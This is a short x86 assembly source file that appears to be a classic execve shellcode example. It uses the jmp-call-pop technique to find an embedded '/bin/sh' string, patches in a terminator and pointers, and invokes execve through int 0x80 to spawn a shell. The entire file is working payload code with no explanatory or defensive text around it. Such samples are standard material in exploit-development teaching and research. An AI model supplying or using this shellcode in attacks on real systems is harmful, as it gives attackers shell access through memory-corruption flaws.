.text
  .globl _start

_start:

jmp GotoCall

Shellcode:

popl %esi
xorl %eax,%eax
movb %al, 0x7(%esi) 
movl %esi, 0x8(%esi)
movl %eax, 0xC(%esi)
movb $11, %al
movl %esi, %ebx
leal 0x8(%esi), %ecx
leal 0xC(%esi), %edx
int $0x80

GotoCall:
	call Shellcode
        strvar:
		.ascii "/bin/shABBBBCCCC"

